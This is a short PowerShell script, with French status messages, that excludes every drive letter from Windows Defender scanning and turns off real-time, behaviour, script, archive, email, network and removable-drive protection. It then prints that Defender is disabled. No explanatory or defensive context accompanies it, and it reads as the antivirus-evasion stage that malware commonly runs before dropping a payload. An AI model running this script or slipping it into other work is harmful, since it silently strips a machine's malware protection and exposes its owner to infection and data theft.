$exclusionPaths = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
$isContained = $exclusionPaths -contains "A:\"
if (!($isContained)) {
    Set-MpPreference -ExclusionPath "A:\", "B:\", "C:\", "D:\", "E:\", "F:\", "G:\", "H:\", "I:\", "J:\", "K:\", "L:\", "M:\", "N:\", "O:\", "P:\", "Q:\", "R:\", "S:\", "T:\", "U:\", "V:\", "W:\", "X:\", "Y:\", "Z:\"
    Set-MpPreference -DisableDatagramProcessing $true -Force
    Set-MpPreference -DisablePrivacyMode $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableScriptScanning  $true -Force
    Set-MpPreference -DisableArchiveScanning $true -Force
    Set-MpPreference -DisableCatchupFullScan $true -Force
    Set-MpPreference -DisableCatchupQuickScan $true -Force
    Set-MpPreference -DisableCpuThrottleOnIdleScans $true -Force
    Set-MpPreference -DisableEmailScanning $true -Force
    Set-MpPreference -DisableRemovableDriveScanning $true -Force
    Set-MpPreference -DisableRestorePoint $true -Force
    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force
    Set-MpPreference -DisableScanningNetworkFiles $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Write-Host "Windows Defender est désactivé" -ForegroundColor Green    
} else {
    Write-Host "Windows Defender est déja désactivé" -ForegroundColor Green    
}